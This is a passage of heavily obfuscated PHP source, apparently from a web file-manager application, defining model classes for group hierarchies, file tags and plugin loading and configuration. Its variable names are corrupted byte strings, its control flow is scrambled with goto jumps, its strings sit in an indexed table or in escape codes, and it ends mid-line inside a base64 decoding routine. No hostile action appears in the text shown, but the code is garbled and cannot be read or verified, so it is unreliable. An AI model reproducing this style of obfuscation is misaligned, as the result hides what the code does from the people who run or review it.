array_to_keyvalue($b²ÍİªØ‡¾, $d¦‹Ú„‰Ä‘[89], $d¦‹Ú„‰Ä‘[359]); } unset($b²ÍİªØ‡¾); goto B…·èéÔÂä; f‘Æ²¯›¢”: } protected function parentLevelArray($a„¨ïÕÑ³‡) { $A‚¦’îŒ©¹ =& $_SERVER[¬ˆÚÂ”Éğä]; $a„¨ïÕÑ³‡ = explode($A‚¦’îŒ©¹[47], trim($a„¨ïÕÑ³‡, $A‚¦’îŒ©¹[47])); $a„¨ïÕÑ³‡ = array_remove_value($a„¨ïÕÑ³‡, $A‚¦’îŒ©¹[470]); return $a„¨ïÕÑ³‡; } private function _listAppendParent(&$D¬ğ¿§Çã) { goto eöÕ§¸«‰™; eöÕ§¸«‰™: $dƒ„ì¨ Ñ« =& $_SERVER[¬ˆÚÂ”Éğä]; $d¦ ƒŠÎİ™ = array(); foreach ($D¬ğ¿§Çã as &$BÇ©ï¦º‘) { $d¦ ƒŠÎİ™[$BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[2121]]] = $BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[28]]; $F‰ÑÛÉÄ’ã = $this->parentLevelArray($BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[461]]); foreach ($F‰ÑÛÉÄ’ã as $cÉ‹È²ÇÄ) { if (!isset($d¦ ƒŠÎİ™[$cÉ‹È²ÇÄ])) { $d¦ ƒŠÎİ™[$cÉ‹È²ÇÄ] = 0; } } } goto C§¬„‚‰°; c”‹êÈä—ä: if ($FÇ±™ÖäÒ) { $aä„É³‰êŠ = array($dƒ„ì¨ Ñ«[2198] => array($dƒ„ì¨ Ñ«[384], $FÇ±™ÖäÒ)); $B«”Ìœ¶Øé = $this->field($dƒ„ì¨ Ñ«[2211])->where($aä„É³‰êŠ)->select(); $c¢Ã·ÓÕƒŞ = array_to_keyvalue($B«”Ìœ¶Øé, $dƒ„ì¨ Ñ«[2121], $dƒ„ì¨ Ñ«[28]); $d¦ ƒŠÎİ™ = array_merge_index($d¦ ƒŠÎİ™, $c¢Ã·ÓÕƒŞ); } $D³‡éÁíš¿ = $GLOBALS[$dƒ„ì¨ Ñ«[6]][$dƒ„ì¨ Ñ«[84]][$dƒ„ì¨ Ñ«[2212]]; foreach ($D¬ğ¿§Çã as &$BÇ©ï¦º‘) { $F‰ÑÛÉÄ’ã = $this->parentLevelArray($BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[461]]); $EäÕ¹Æ×Ë = $dƒ„ì¨ Ñ«[33]; foreach ($F‰ÑÛÉÄ’ã as $e—º¨Ú§ö¨ => $cÉ‹È²ÇÄ) { if ($D³‡éÁíš¿ && $e—º¨Ú§ö¨ == 0) { continue; } $EäÕ¹Æ×Ë .= $d¦ ƒŠÎİ™[$cÉ‹È²ÇÄ] . $dƒ„ì¨ Ñ«[8]; } if ($F‰ÑÛÉÄ’ã) { $EäÕ¹Æ×Ë .= $BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[28]]; } $BÇ©ï¦º‘[$dƒ„ì¨ Ñ«[465]] = str_replace($dƒ„ì¨ Ñ«[469], $dƒ„ì¨ Ñ«[8], $EäÕ¹Æ×Ë); } goto BÄËĞÆ´íÏ; BÄËĞÆ´íÏ: unset($BÇ©ï¦º‘); goto C»Ô©à‹·©; C§¬„‚‰°: unset($BÇ©ï¦º‘); $FÇ±™ÖäÒ = array(); foreach ($d¦ ƒŠÎİ™ as $e—º¨Ú§ö¨ => $Cç“ùœå©ñ) { if (!$Cç“ùœå©ñ) { $FÇ±™ÖäÒ[] = $e—º¨Ú§ö¨; } } goto c”‹êÈä—ä; C»Ô©à‹·©: } private function _listAppendSourceRoot(&$B–Ï¥…˜çØ, $CÃªÊÑ©ÎÙ) { goto A•¬ƒ”èˆ; bà‚éÈÕö: foreach ($B–Ï¥…˜çØ as &$dŠğß‰¯¶) { $dŠğß‰¯¶[$e²‚ã×ó“É[391]] = $b×ƒ¢ßƒÎí[$dŠğß‰¯¶[$e²‚ã×ó“É[2121]]] ? $b×ƒ¢ßƒÎí[$dŠğß‰¯¶[$e²‚ã×ó“É[2121]]] : array(); } unset($dŠğß‰¯¶); goto e£“ïŸÒœ; C¬®³‚÷³Î: $b×ƒ¢ßƒÎí = Model($e²‚ã×ó“É[760])->order($e²‚ã×ó“É[2214])->field($BèòÙÉøœÈ)->where($EŠ°„ˆ†æ”)->select(); $b×ƒ¢ßƒÎí = array_to_keyvalue($b×ƒ¢ßƒÎí, $e²‚ã×ó“É[458]); $b×ƒ¢ßƒÎí = array_remove_key($b×ƒ¢ßƒÎí, $e²‚ã×ó“É[458]); goto bà‚éÈÕö; A•¬ƒ”èˆ: $e²‚ã×ó“É =& $_SERVER[¬ˆÚÂ”Éğä]; $EŠ°„ˆ†æ” = array($e²‚ã×ó“É[371] => SourceModel::TYPE_GROUP, $e²‚ã×ó“É[463] => 0, $e²‚ã×ó“É[458] => array($e²‚ã×ó“É[7], $CÃªÊÑ©ÎÙ)); $BèòÙÉøœÈ = $e²‚ã×ó“É[2213]; goto C¬®³‚÷³Î; e£“ïŸÒœ: } protected function groupMerge($C‡î¦Î··Æ) { $C‡î¦Î··Æ = array_values(array_unique($C‡î¦Î··Æ)); $CÅê«ã¿½ = array(); for ($A‡æ—ù…‹İ = 0; $A‡æ—ù…‹İ < count($C‡î¦Î··Æ); $A‡æ—ù…‹İ++) { $fˆä®çÍ°Â = !1; for ($FÔ¶„÷… = 0; $FÔ¶„÷… < count($C‡î¦Î··Æ); $FÔ¶„÷…++) { if ($A‡æ—ù…‹İ == $FÔ¶„÷…) { continue; } if ($this->isParentOf($C‡î¦Î··Æ[$FÔ¶„÷…], $C‡î¦Î··Æ[$A‡æ—ù…‹İ])) { $fˆä®çÍ°Â = !0; break; } } if (!$fˆä®çÍ°Â) { $CÅê«ã¿½[] = $C‡î¦Î··Æ[$A‡æ—ù…‹İ]; } } return $CÅê«ã¿½; } protected function isParentOf($E˜÷ƒëÈÆæ, $fÚñ÷á¥ÂÂ) { goto Eï³êÀ°; D‹±„£Ÿ¸ñ: return !1; goto B¯‹…ğ†Š; Eï³êÀ°: $bÛÔšÕ«ˆ’ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$E˜÷ƒëÈÆæ || !$fÚñ÷á¥ÂÂ || $E˜÷ƒëÈÆæ == $fÚñ÷á¥ÂÂ) { return !1; } $b‚éµÂ™¿½ = $this->getInfoSimple($E˜÷ƒëÈÆæ); goto dÏ‡ ×Î; dÏ‡ ×Î: $AÂ¿Ñ‰´é = $this->getInfoSimple($fÚñ÷á¥ÂÂ); $CÓ­ßóÒ±Ã = $b‚éµÂ™¿½[$bÛÔšÕ«ˆ’[461]] . $E˜÷ƒëÈÆæ . $bÛÔšÕ«ˆ’[47]; if (substr($AÂ¿Ñ‰´é[$bÛÔšÕ«ˆ’[461]], 0, strlen($CÓ­ßóÒ±Ã)) == $CÓ­ßóÒ±Ã) { return !0; } goto D‹±„£Ÿ¸ñ; B¯‹…ğ†Š: } public function groupShowRoot($aÔğ’Ğ‚ó, $cÇÄœãÁº„ = false) { goto F˜§ƒ±Ğµî; Bç¾Á“²¨: return $EÌŸ·½ê¨‰; goto e¿™›‹ñâÑ; C¤éŸæãÔ: $EË¯êÛÍè¡ = $this->parentLevelArray($F±¶³Ó“°[$c±¦×äº°”[461]]); $EÌŸ·½ê¨‰ = array($aÔğ’Ğ‚ó); if (count($EË¯êÛÍè¡) == 0) { return $EÌŸ·½ê¨‰; } goto f¨‘¦Ñ¯ïå; F˜§ƒ±Ğµî: $c±¦×äº°” =& $_SERVER[¬ˆÚÂ”Éğä]; $F±¶³Ó“° = $this->getInfo($aÔğ’Ğ‚ó); if (!$F±¶³Ó“°) { return array(); } goto C¤éŸæãÔ; f¨‘¦Ñ¯ïå: if ($cÇÄœãÁº„ && count($EË¯êÛÍè¡) == 1) { return $EÌŸ·½ê¨‰; } if (!$F±¶³Ó“°[$c±¦×äº°”[417]] || !isset($F±¶³Ó“°[$c±¦×äº°”[417]][$c±¦×äº°”[2196]]) || $F±¶³Ó“°[$c±¦×äº°”[417]][$c±¦×äº°”[2196]] == $c±¦×äº°”[2170]) { return $this->groupShowRoot($EË¯êÛÍè¡[count($EË¯êÛÍè¡) - 1], $cÇÄœãÁº„); } if ($F±¶³Ó“°[$c±¦×äº°”[417]][$c±¦×äº°”[2196]] == $c±¦×äº°”[346]) { $fÄ“‹Àˆî¿ = explode($c±¦×äº°”[47], $F±¶³Ó“°[$c±¦×äº°”[417]][$c±¦×äº°”[2197]]); if ($fÄ“‹Àˆî¿) { $EÌŸ·½ê¨‰ = array_merge($EÌŸ·½ê¨‰, $fÄ“‹Àˆî¿); } } goto Bç¾Á“²¨; e¿™›‹ñâÑ: } protected function resetParentLevel() { $Aäàç‹Üï =& $_SERVER[¬ˆÚÂ”Éğä]; $cµùÊêÙ§ = $Aäàç‹Üï[2121]; $Cçù‰ğÕŒó = $this->select(); $Cçù‰ğÕŒó = array_to_keyvalue($Cçù‰ğÕŒó, $cµùÊêÙ§); foreach ($Cçù‰ğÕŒó as $c¦ã‹„ÉÒí) { goto FŞâÜ·ô±; FŞâÜ·ô±: $fº«ÉÇ³ùã = $c¦ã‹„ÉÒí; $aá«åñšÕ = array(); while ($fº«ÉÇ³ùã[$Aäàç‹Üï[463]] != 0) { $aá«åñšÕ[] = $fº«ÉÇ³ùã[$Aäàç‹Üï[463]]; $fº«ÉÇ³ùã = $Cçù‰ğÕŒó[$fº«ÉÇ³ùã[$Aäàç‹Üï[463]]]; } goto DÓÕÙÜŸƒ³; fè–­ùÜíñ: $this->where(array($cµùÊêÙ§ => $c¦ã‹„ÉÒí[$cµùÊêÙ§]))->save(array($Aäàç‹Üï[527] => $aá«åñšÕ)); goto d˜‘’Ø–®¦; DÓÕÙÜŸƒ³: $aá«åñšÕ[] = 0; $aá«åñšÕ = $Aäàç‹Üï[47] . implode($Aäàç‹Üï[47], array_reverse($aá«åñšÕ)) . $Aäàç‹Üï[47]; $this->setNamePinyin($c¦ã‹„ÉÒí[$cµùÊêÙ§], $c¦ã‹„ÉÒí[$Aäàç‹Üï[28]]); goto fè–­ùÜíñ; d˜‘’Ø–®¦: } return $Cçù‰ğÕŒó; } public function groupNameAuto($fÄùµçÓœ, $cæÊã¤†´ø) { $BÑË¿ø©¼ =& $_SERVER[¬ˆÚÂ”Éğä]; $bè’¥Í¹¶ = $this->where(array($BÑË¿ø©¼[368] => $fÄùµçÓœ))->getField($BÑË¿ø©¼[28], !0); if (!$bè’¥Í¹¶ || !in_array($cæÊã¤†´ø, $bè’¥Í¹¶)) { return $cæÊã¤†´ø; } for ($FÁÒ´®ËÅ® = 1; $FÁÒ´®ËÅ® <= count($bè’¥Í¹¶) + 1; $FÁÒ´®ËÅ®++) { $aç½›á½®á = $cæÊã¤†´ø . "\x28{$FÁÒ´®ËÅ®}\x29"; if (!in_array($aç½›á½®á, $bè’¥Í¹¶)) { return $aç½›á½®á; } } } } class GroupTagModel extends ModelBase { protected $tableName = "\165\x73\145\162\x5f\146\141\166"; protected function cacheFunctionAlias($Aô‚†Æ¬Æ„) { $CäÌöêÖÈò =& $_SERVER[¬ˆÚÂ”Éğä]; return array($CäÌöêÖÈò[2215] => array($Aô‚†Æ¬Æ„[0], $CäÌöêÖÈò[2216]), $CäÌöêÖÈò[2217] => array($Aô‚†Æ¬Æ„[0], $CäÌöêÖÈò[2218])); } protected function get($dÙõïÓğ) { $eÃ’‚ÚƒÇŠ =& $_SERVER[¬ˆÚÂ”Éğä]; $e«öÀ×¿É = Model($eÃ’‚ÚƒÇŠ[460])->metaGet($dÙõïÓğ, $eÃ’‚ÚƒÇŠ[2219]); $E„åÚ©Ü¦¿ = json_decode($e«öÀ×¿É, !0); return $E„åÚ©Ü¦¿ ? $E„åÚ©Ü¦¿ : array($eÃ’‚ÚƒÇŠ[2220] => $eÃ’‚ÚƒÇŠ[83], $eÃ’‚ÚƒÇŠ[354] => array()); } protected function set($c¶òªÔ†¶„, $d£Óª‘ÏÑ) { $aÖ†ì¿†‹Ş =& $_SERVER[¬ˆÚÂ”Éğä]; $d£Óª‘ÏÑ = $d£Óª‘ÏÑ ? $d£Óª‘ÏÑ : array($aÖ†ì¿†‹Ş[2220] => $aÖ†ì¿†‹Ş[83], $aÖ†ì¿†‹Ş[354] => array()); Model($aÖ†ì¿†‹Ş[460])->metaSet($c¶òªÔ†¶„, $aÖ†ì¿†‹Ş[2219], json_encode($d£Óª‘ÏÑ)); return Model($aÖ†ì¿†‹Ş[460])->metaSet($c¶òªÔ†¶„, $aÖ†ì¿†‹Ş[2219], json_encode($d£Óª‘ÏÑ)); } protected function getByTagID($eƒàÛäœß, $B¦¼ÎÅ¶¸ˆ) { goto D³Éí“áÓì; D³Éí“áÓì: $a®ÏÊœ±ê× =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$eƒàÛäœß || !$B¦¼ÎÅ¶¸ˆ) { return !1; } if (!Model($a®ÏÊœ±ê×[460])->getInfoSimple($eƒàÛäœß)) { return !1; } goto B† øğ÷‹â; A¡‹ŠÏÂØ¬: return is_array($bô´ªª£È¸) ? $bô´ªª£È¸ : !1; goto B¦¡ç¢•Š¶; B† øğ÷‹â: $e˜Ï±–êÎŠ = $this->get($eƒàÛäœß); if (!$e˜Ï±–êÎŠ || !isset($e˜Ï±–êÎŠ[$a®ÏÊœ±ê×[354]])) { return !1; } $bô´ªª£È¸ = array_find_by_field($e˜Ï±–êÎŠ[$a®ÏÊœ±ê×[354]], $a®ÏÊœ±ê×[367], $B¦¼ÎÅ¶¸ˆ); goto A¡‹ŠÏÂØ¬; B¦¡ç¢•Š¶: } public function listSource($AÜÊÖØ‡Ê³, $cŠŸ©ö…·) { goto EÌŒ¼‘–·; bóœÉÅİÚ¾: if ($fÃ·ªé×Şğ) { $this->removeBySource($AÜÊÖØ‡Ê³, $fÃ·ªé×Şğ); } return $b•Ñ‘Àâ½ê; goto aÈöŸ‘íëù; f§¯¸Ùµ°é: $bÃËÚòŞöâ = array(); foreach ($b«¸šâ‚¦¬ as $C±ßßÊÇ…ø) { $F´‘‚æ˜ = $C±ßßÊÇ…ø[$CĞŠïŠ¥ÜÔ[75]]; if (!$F´‘‚æ˜) { continue; } if (!isset($bÃËÚòŞöâ[$F´‘‚æ˜])) { $bÃËÚòŞöâ[$F´‘‚æ˜] = array(); } $bÃËÚòŞöâ[$F´‘‚æ˜][] = $C±ßßÊÇ…ø[$CĞŠïŠ¥ÜÔ[393]]; } $Bèñ¦Û˜· = array(); goto f¨á¼Îö; f¾È¹ºÅ×­: $DÈšß¢‹¿ = array_to_keyvalue($b•Ñ‘Àâ½ê[$CĞŠïŠ¥ÜÔ[73]], $CĞŠïŠ¥ÜÔ[33], $CĞŠïŠ¥ÜÔ[369]); $bÚ¯÷Ö—À¡ = array_merge($DÈšß¢‹¿, $aÌŒÒ–ß’); foreach ($Bèñ¦Û˜· as $F´‘‚æ˜) { if (!in_array($F´‘‚æ˜, $bÚ¯÷Ö—À¡)) { $fÃ·ªé×Şğ[] = $F´‘‚æ˜; } } goto bóœÉÅİÚ¾; EÌŒ¼‘–·: $CĞŠïŠ¥ÜÔ =& $_SERVER[¬ˆÚÂ”Éğä]; if ($cŠŸ©ö…· && !is_array($cŠŸ©ö…·)) { $cŠŸ©ö…· = array($cŠŸ©ö…·); } $b«¸šâ‚¦¬ = $this->listData($AÜÊÖØ‡Ê³); goto f§¯¸Ùµ°é; f¨á¼Îö: foreach ($bÃËÚòŞöâ as $cä´Áœöâ¶ => $fŠ‰„ÊÒ–) { $Fñ” ù—¸æ = !0; if (!$cŠŸ©ö…·) { $Bèñ¦Û˜·[] = $cä´Áœöâ¶; continue; } foreach ($cŠŸ©ö…· as $Dİ“•ÚŸÖÄ) { if (!in_array($Dİ“•ÚŸÖÄ, $fŠ‰„ÊÒ–)) { $Fñ” ù—¸æ = !1; break; } } if ($Fñ” ù—¸æ) { $Bèñ¦Û˜·[] = $cä´Áœöâ¶; } } if (!$Bèñ¦Û˜·) { return array(); } $b•Ñ‘Àâ½ê = Model($CĞŠïŠ¥ÜÔ[1130])->listSource(array($CĞŠïŠ¥ÜÔ[383] => array($CĞŠïŠ¥ÜÔ[384], $Bèñ¦Û˜·))); goto d©äÔ»î¥–; d©äÔ»î¥–: if (!$b•Ñ‘Àâ½ê || count($Bèñ¦Û˜·) == $b•Ñ‘Àâ½ê[$CĞŠïŠ¥ÜÔ[351]][$CĞŠïŠ¥ÜÔ[352]]) { return $b•Ñ‘Àâ½ê; } $fÃ·ªé×Şğ = array(); $aÌŒÒ–ß’ = array_to_keyvalue($b•Ñ‘Àâ½ê[$CĞŠïŠ¥ÜÔ[74]], $CĞŠïŠ¥ÜÔ[33], $CĞŠïŠ¥ÜÔ[369]); goto f¾È¹ºÅ×­; aÈöŸ‘íëù: } protected function listData($e†„Ğ“”©ï) { $D¬œŒ‚‰— =& $_SERVER[¬ˆÚÂ”Éğä]; $F©ŸÊê£© = array($D¬œŒ‚‰—[1441] => 0, $D¬œŒ‚‰—[436] => array($D¬œŒ‚‰—[2221], 0), $D¬œŒ‚‰—[388] => $D¬œŒ‚‰—[2222] . $e†„Ğ“”©ï); $C—ÏîÕ˜ß´ = $D¬œŒ‚‰—[2223]; $DæïùÚíÆ˜ = $this->field($C—ÏîÕ˜ß´)->where($F©ŸÊê£©)->order($D¬œŒ‚‰—[2224])->select(); return $DæïùÚíÆ˜ ? $DæïùÚíÆ˜ : array(); } protected function addToTag($C»³ˆœ»­è, $F…ñÏÂÖ…Ø, $aã“¯ªá„) { $aÜöæä“š =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->getByTagID($C»³ˆœ»­è, $aã“¯ªá„) || !$F…ñÏÂÖ…Ø) { return !1; } if (!Model($aÜöæä“š[760])->pathInfo($F…ñÏÂÖ…Ø)) { return !1; } $BÈŸÚ®±Ñ’ = array($aÜöæä“š[1441] => 0, $aÜöæä“š[436] => $aã“¯ªá„, $aÜöæä“š[387] => $F…ñÏÂÖ…Ø, $aÜöæä“š[388] => $aÜöæä“š[2225] . $C»³ˆœ»­è, $aÜöæä“š[386] => $aÜöæä“š[33], $aÜöæä“š[2125] => 0); if ($this->where($BÈŸÚ®±Ñ’)->find()) { return !1; } return $this->add($BÈŸÚ®±Ñ’); } protected function removeFromTag($BŞÒÓ¢ºğ, $E®–§†Ô’Õ, $EîÌ»¯¤“) { $c£ÕŒ„¸±Â =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->getByTagID($BŞÒÓ¢ºğ, $EîÌ»¯¤“) || !$E®–§†Ô’Õ) { return !1; } if (is_array($E®–§†Ô’Õ)) { $E®–§†Ô’Õ = array($c£ÕŒ„¸±Â[7], $E®–§†Ô’Õ); } $eÏĞÚ‰Åó = array($c£ÕŒ„¸±Â[1441] => 0, $c£ÕŒ„¸±Â[436] => $EîÌ»¯¤“, $c£ÕŒ„¸±Â[388] => $c£ÕŒ„¸±Â[2225] . $BŞÒÓ¢ºğ, $c£ÕŒ„¸±Â[387] => $E®–§†Ô’Õ); return $this->where($eÏĞÚ‰Åó)->delete(); } protected function removeByTag($bø §ïÉˆ, $E÷”åÅ†ÁÊ) { $b¬‰Ø†“êù =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$this->getByTagID($bø §ïÉˆ, $E÷”åÅ†ÁÊ)) { return !1; } $b‡’º¸ƒó— = array($b¬‰Ø†“êù[1441] => 0, $b¬‰Ø†“êù[436] => $E÷”åÅ†ÁÊ, $b¬‰Ø†“êù[388] => $b¬‰Ø†“êù[2225] . $bø §ïÉˆ); return $this->where($b‡’º¸ƒó—)->delete(); } protected function removeBySource($d¢¬„¬ÎÏ–, $Cç¤ŠÚÕ) { $EÖ¤š¤¸˜ =& $_SERVER[¬ˆÚÂ”Éğä]; if (!$d¢¬„¬ÎÏ– || !$Cç¤ŠÚÕ) { return !1; } if (is_array($Cç¤ŠÚÕ)) { $Cç¤ŠÚÕ = array($EÖ¤š¤¸˜[7], $Cç¤ŠÚÕ); } $D²’İÃ«¯¥ = array($EÖ¤š¤¸˜[1441] => 0, $EÖ¤š¤¸˜[387] => $Cç¤ŠÚÕ, $EÖ¤š¤¸˜[436] => array($EÖ¤š¤¸˜[940], 0), $EÖ¤š¤¸˜[388] => $EÖ¤š¤¸˜[2225] . $d¢¬„¬ÎÏ–); return $this->where($D²’İÃ«¯¥)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\x53\x79\163\164\145\155\x2e\x70\154\165\x67\151\x6e\x4c\x69\163\164"; public $field = array("\x6e\x61\155\x65", "\x73\x74\x61\x74\x75\163", "\x72\x65\147\151\145\163\x74", "\143\x6f\156\146\x69\147"); public function loadList($cÜç„¡æ«ä = false) { $c‹‡Èá‰ãè = array_to_keyvalue($this->listData(), $_SERVER[¬ˆÚÂ”Éğä][28]); if ($cÜç„¡æ«ä) { return $c‹‡Èá‰ãè[$cÜç„¡æ«ä]; } return $c‹‡Èá‰ãè; } public function init() { $aÙ…¢‚ÙË =& $_SERVER[¬ˆÚÂ”Éğä]; Hook::trigger($aÙ…¢‚ÙË[2226]); $DÚ”á»îßí = $this->loadPluginList(); foreach ($DÚ”á»îßí as $aÇÍóÅ²™Ş => $EõŸšÛì¬Å) { $F”İ†¶İ = $this->appAllow($aÇÍóÅ²™Ş, $EõŸšÛì¬Å); if (!$F”İ†¶İ) { continue; } foreach ($EõŸšÛì¬Å[$aÙ…¢‚ÙË[2227]] as $fÒ…óºäÅ„ => $Aè®¡ÑÜ÷à) { Hook::bind($fÒ…óºäÅ„, $Aè®¡ÑÜ÷à); } } Hook::trigger($aÙ…¢‚ÙË[2228]); Hook::trigger(ACTION); } public function appAllow($d×ñ¨ç‹»´, $aê³Í¶÷Ûº, $F¼›œ´…è = true) { $C–º»Ö½± =& $_SERVER[¬ˆÚÂ”Éğä]; $E®‹ºßŞ” = PLUGIN_DIR . $d×ñ¨ç‹»´ . $C–º»Ö½±[2229]; if (!is_array($aê³Í¶÷Ûº) || !is_array($aê³Í¶÷Ûº[$C–º»Ö½±[2227]]) || !is_file($E®‹ºßŞ”) || $aê³Í¶÷Ûº[$C–º»Ö½±[697]] != 1) { return !1; } if ($F¼›œ´…è && !Action($C–º»Ö½±[2230])->checkAuth($d×ñ¨ç‹»´)) { return !1; } return !0; } public function unInstall($béÎ¶¼—¿Ö) { $Cƒñ“İ–çù =& $_SERVER[¬ˆÚÂ”Éğä]; $D¯ãÑèŒï  = $this->loadList($béÎ¶¼—¿Ö); if (file_exists(PLUGIN_DIR . $béÎ¶¼—¿Ö)) { Hook::apply($béÎ¶¼—¿Ö . $Cƒñ“İ–çù[2231]); } $this->remove($D¯ãÑèŒï [$Cƒñ“İ–çù[367]]); } public function changeStatus($E²’Œœõâ, $A†È–—í©µ) { $Aµ‚Ü©ÆİÕ =& $_SERVER[¬ˆÚÂ”Éğä]; $DÁ˜›±º‰œ = $this->loadList($E²’Œœõâ); if ($A†È–—í©µ) { Hook::apply($E²’Œœõâ . $Aµ‚Ü©ÆİÕ[2232]); } $this->update($DÁ˜›±º‰œ[$Aµ‚Ü©ÆİÕ[367]], array($Aµ‚Ü©ÆİÕ[2233] => $A†È–—í©µ)); } public function appRegist($b†Í¦«¸Æ§, $C‘ÎöìöŸâ) { $A” ©æƒÔØ =& $_SERVER[¬ˆÚÂ”Éğä]; $CˆàçŠ¾Ø = $this->loadList($b†Í¦«¸Æ§); if ($CˆàçŠ¾Ø) { $this->update($CˆàçŠ¾Ø[$A” ©æƒÔØ[367]], array($A” ©æƒÔØ[2227] => $C‘ÎöìöŸâ)); } else { $A½Ô–»¶¯ù = array($A” ©æƒÔØ[28] => $b†Í¦«¸Æ§, $A” ©æƒÔØ[2227] => $C‘ÎöìöŸâ, $A” ©æƒÔØ[697] => 0, $A” ©æƒÔØ[6] => $this->getConfigDefault($b†Í¦«¸Æ§)); $this->insert($A½Ô–»¶¯ù); } } public function getConfigDefault($cí± áÄ¢Ò) { $a¦â…„„Æ› =& $_SERVER[¬ˆÚÂ”Éğä]; $Fî¸³ˆ‰ÇÖ = array(); $BÔóæ°²“¬ = $this->getPackageJson($cí± áÄ¢Ò); if (!$BÔóæ°²“¬ && is_array($BÔóæ°²“¬[$a¦â…„„Æ›[2234]])) { return $Fî¸³ˆ‰ÇÖ; } foreach ($BÔóæ°²“¬[$a¦â…„„Æ›[2234]] as $eà³ŠÎœ => $DÆÅ¦„ïÎì) { if (!isset($DÆÅ¦„ïÎì[$a¦â…„„Æ›[359]]) || isset($Fî¸³ˆ‰ÇÖ[$eà³ŠÎœ])) { continue; } $Fî¸³ˆ‰ÇÖ[$eà³ŠÎœ] = $DÆÅ¦„ïÎì[$a¦â…„„Æ›[359]]; } return $Fî¸³ˆ‰ÇÖ; } public function getPackageJson($bğæ¶ƒ’ôÏ) { return Hook::apply($bğæ¶ƒ’ôÏ . $_SERVER[¬ˆÚÂ”Éğä][2235]); } public function getConfig($Eå‰íÜ¤», $A•ÓœÚ÷ÓŠ = false) { $A½Ä¸ÛåÑ» =& $_SERVER[¬ˆÚÂ”Éğä]; $eĞï“¢é… = array(); $c‘¡‡˜Ü…† = $this->loadList($Eå‰íÜ¤»); if ($c‘¡‡˜Ü…† && is_array($c‘¡‡˜Ü…†[$A½Ä¸ÛåÑ»[6]])) { $eĞï“¢é… = $c‘¡‡˜Ü…†[$A½Ä¸ÛåÑ»[6]]; } if (!$eĞï“¢é… || $A•ÓœÚ÷ÓŠ) { $eĞï“¢é… = $this->getConfigDefault($Eå‰íÜ¤»); } return $eĞï“¢é…; } public function setConfig($cò‹ÇÎñõ, $b ÷Õ§ß = false) { goto BÊì¯°’Õ›; BÊì¯°’Õ›: $Fğ†‚Ş¸¯† =& $_SERVER[¬ˆÚÂ”Éğä]; $e‡Õôî±È = $this->loadList($cò‹ÇÎñõ); if (!$e‡Õôî±È) { return !1; } goto BÛƒ¾ìã°ï; F‘¤¨¤ÕÛ: $this->update($e‡Õôî±È[$Fğ†‚Ş¸¯†[367]], array($Fğ†‚Ş¸¯†[6] => $A×¥…ïÑ×)); goto aÙ„›³ù©Ÿ; BÛƒ¾ìã°ï: $A×¥…ïÑ× = $e‡Õôî±È[$Fğ†‚Ş¸¯†[6]]; if ($b ÷Õ§ß == !1) { $A×¥…ïÑ× = array(); $b ÷Õ§ß = $this->getConfigDefault($cò‹ÇÎñõ); } foreach ($b ÷Õ§ß as $d—°ÈÙ“Âİ => $BÕ§Íˆôì¥) { $A×¥…ïÑ×[$d—°ÈÙ“Âİ] = is_string($BÕ§Íˆôì¥) ? trim($BÕ§Íˆôì¥) : $BÕ§Íˆôì¥; } goto F‘¤¨¤ÕÛ; aÙ„›³ù©Ÿ: } public function viewList() { goto CÛå˜ñ¶Õ†; CÛå˜ñ¶Õ†: $Dë¦–…İÜ˜ =& $_SERVER[¬ˆÚÂ”Éğä]; $Dæ¼å‰ø°ç = $this->loadList(); $this->pluginScan($Dæ¼å‰ø°ç); goto c‰ğˆç°‹ã; b’ÑòªÔ®š: return $DœÂì¥®×; goto dÆåÆÌÊ­; c‰ğˆç°‹ã: $Dæ¼å‰ø°ç = $this->loadPluginList(); $DœÂì¥®× = array(); foreach ($Dæ¼å‰ø°ç as $BÓ—è›¿‰œ => $b¶ÌÖÏÍí×) { unset($b¶ÌÖÏÍí×[$Dë¦–…İÜ˜[2227]], $b¶ÌÖÏÍí×[$Dë¦–…İÜ˜[6]]); $fÍ‡ËÎ‹‚ = PLUGIN_DIR . $b¶ÌÖÏÍí×[$Dë¦–…İÜ˜[28]] . $Dë¦–…İÜ˜[2229]; if (!is_file($fÍ‡ËÎ‹‚)) { continue; } $B»—à°éñ = Hook::apply($b¶ÌÖÏÍí×[$Dë¦–…İÜ˜[28]] . $Dë¦–…İÜ˜[2235]); if (is_array($B»—à°éñ)) { $DœÂì¥®×[$BÓ—è›¿‰œ] = array_merge($b¶ÌÖÏÍí×, $B»—à°éñ); } } goto b’ÑòªÔ®š; dÆåÆÌÊ­: } private function loadPluginList() { $A¸†Ô°Ó‰ =& $_SERVER[¬ˆÚÂ”Éğä]; $e»äóÙŠëƒ = $this->loadList(); if (strtolower(MOD) == $A¸†Ô°Ó‰[2236]) { return $e»äóÙŠëƒ; } $bï§­¼áÁ = Hook::trigger($A¸†Ô°Ó‰[2237], $e»äóÙŠëƒ); if ($e»äóÙŠëƒ && !$bï§­¼áÁ) { die; } return $bï§­¼áÁ ? $bï§­¼áÁ : $e»äóÙŠëƒ; } private function pluginScan($eĞÇ©´ëä) { $AÄäˆİÖ =& $_SERVER[¬ˆÚÂ”Éğä]; recursion_dir(PLUGIN_DIR, $c®ˆ®œ“†Ø, $eñ¼¡™ÇÍ¶, 0); foreach ($c®ˆ®œ“†Ø as $b£½ó˜Áƒè) { $AƒŠ…éá…é = get_path_this($b£½ó˜Áƒè); if (isset($eĞÇ©´ëä[$AƒŠ…éá…é]) || !file_exists($b£½ó˜Áƒè . $AÄäˆİÖ[2238]) || !file_exists($b£½ó˜Áƒè . $AÄäˆİÖ[2229])) { continue; } Hook::apply($AƒŠ…éá…é . $AÄäˆİÖ[2232]); } } } goto DÇ®­ÓìŒ­; D£Ù¥êŸŒ: if (!function_exists('_kodDe')) { function _kodDe($FŸ‹÷¡‹‚“) { $FŸ‹÷¡‹‚“ = base64_decode($FŸ‹÷¡‹‚“); $eôà®˜ôğ = strlen($FŸ‹÷¡‹‚“); $A–¾âÛ‘‘« = ''; $Føö©—àËŸ = ord($FŸ‹÷¡‹‚“[0]) - 30; for ($eå·½¡÷”„ = 1; $eå·½¡÷”„ < $eôà®˜ôğ; $eå·½¡÷”„ += 2) { if 